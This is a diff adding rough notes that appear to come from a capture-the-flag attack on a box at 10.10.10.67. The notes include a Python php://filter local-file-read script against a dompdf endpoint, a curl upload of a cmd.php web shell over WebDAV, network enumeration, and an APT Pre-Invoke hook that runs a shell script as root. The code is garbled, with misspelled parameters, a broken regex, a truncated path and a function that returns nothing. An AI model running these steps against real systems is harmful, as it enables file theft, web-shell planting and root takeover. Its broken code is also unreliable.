@@ -1,0 +1,31 @@
+php wrapper
+
+import requests
+from base64 import b64decode
+import re
+
+def GetFile(file):
+    payload = {'inpurt_file':'php://filter/coverto-base64.encode/resource='+file}
+    res = (requests.get('http://ip/dompdf.php', params = payload).text).strip()
+    
+    b64 = re.search('\[\((*?)"\)\}"',res).group(1)
+
+print(GetFile('/etc/passw').decode())
+
+curl upload shell 
+curl --upload-file http://10.10.10.67/webdav_test_inception/cmd.php --user username:passwd
+
+cd /proc/net
+get tcp
+get udp
+
+one import thing is: 
+you can find the /etc/init.d
+this have interersting -->tftp
+
+
+tftp --> cat create cron for root
+vim 00shell
+-->
+    ATP::update::Pre-Invoke {"/bin/bash /tmp/shell.sh"}
+-->
